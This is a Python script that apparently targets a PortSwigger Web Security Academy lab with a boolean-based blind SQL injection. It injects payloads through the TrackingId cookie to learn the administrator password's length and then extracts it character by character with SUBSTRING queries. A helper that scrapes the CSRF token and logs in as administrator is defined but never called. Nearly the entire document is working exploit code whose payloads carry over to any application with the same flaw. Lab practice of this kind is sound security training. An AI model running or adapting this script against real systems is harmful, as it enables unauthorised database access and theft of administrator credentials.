import requests
import time

class SQLInjectionExploit:
    def __init__(self, lab_url, tracking_cookie):
        self.url = lab_url
        self.tracking_cookie = tracking_cookie
        self.session = requests.Session()
        
    def test_condition(self, payload):
        """Test a SQL condition and return True if 'Welcome back' appears"""
        full_payload = f"{self.tracking_cookie}{payload}"
        cookies = {"TrackingId": full_payload}
        
        try:
            response = self.session.get(self.url, cookies=cookies)
            return "Welcome back" in response.text
        except Exception as e:
            print(f"Request failed: {e}")
            return False
    
    def find_password_length(self, max_length=50):
        """Find the length of the administrator password"""
        print("Finding password length...")
        
        for length in range(1, max_length + 1):
            payload = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{length})='a"
            
            if not self.test_condition(payload):
                print(f"Password length: {length}")
                return length
            
            if length % 5 == 0:
                print(f"Checked up to length {length}...")
        
        print("Could not determine password length")
        return None
    
    def extract_password(self, password_length):
        """Extract the password character by character"""
        characters = "abcdefghijklmnopqrstuvwxyz0123456789"
        password = ""
        
        print(f"Extracting {password_length} character password...")
        
        for position in range(1, password_length + 1):
            found = False
            
            for char in characters:
                payload = f"' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}"
                
                if self.test_condition(payload):
                    password += char
                    found = True
                    print(f"Position {position}/{password_length}: {char} | Password: {password}")
                    break
            
            if not found:
                # Try uppercase
                for char in characters.upper():
                    payload = f"' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}"
                    
                    if self.test_condition(payload):
                        password += char
                        found = True
                        print(f"Position {position}/{password_length}: {char} | Password: {password}")
                        break
            
            if not found:
                password += "?"
                print(f"Position {position}: Could not determine character")
            
            # Small delay to avoid overwhelming the server
            time.sleep(0.1)
        
        return password
    
    def login_as_administrator(self, password):
        """Attempt to login with the found password"""
        login_url = self.url + "login"
        
        # First get the login page to obtain CSRF token
        response = self.session.get(login_url)
        
        # Extract CSRF token (simplified - you might need to adjust based on actual HTML)
        csrf_token = self.extract_csrf_token(response.text)
        
        login_data = {
            "username": "administrator",
            "password": password,
            "csrf": csrf_token
        }
        
        response = self.session.post(login_url, data=login_data)
        
        if "Log out" in response.text or "admin" in response.text.lower():
            print("Successfully logged in as administrator!")
            return True
        else:
            print("Failed to login with the obtained password")
            return False
    
    def extract_csrf_token(self, html):
        """Extract CSRF token from HTML (simplified)"""
        # This is a simplified extraction - adjust based on actual HTML structure
        if 'name="csrf"' in html:
            start = html.find('name="csrf" value="') + 18
            end = html.find('"', start)
            return html[start:end]
        return ""
    
    def run_exploit(self):
        """Run the complete exploit"""
        print("Starting blind SQL injection exploit...")
        
        # Step 1: Find password length
        password_length = self.find_password_length()
        if not password_length:
            return False
        
        # Step 2: Extract password
        password = self.extract_password(password_length)
        
        print(f"\nAdministrator password: {password}")
        
    
        
        return password

# Usage
if __name__ == "__main__":
    # Replace these with your actual values
    LAB_URL = "https://YOUR-LAB-ID.web-security-academy.net/"
    TRACKING_COOKIE = "YOUR-TRACKING-ID-HERE"
    
    exploit = SQLInjectionExploit(LAB_URL, TRACKING_COOKIE)
    password = exploit.run_exploit()
    
    if password:
        print(f"\nUse this password to login as administrator: {password}")
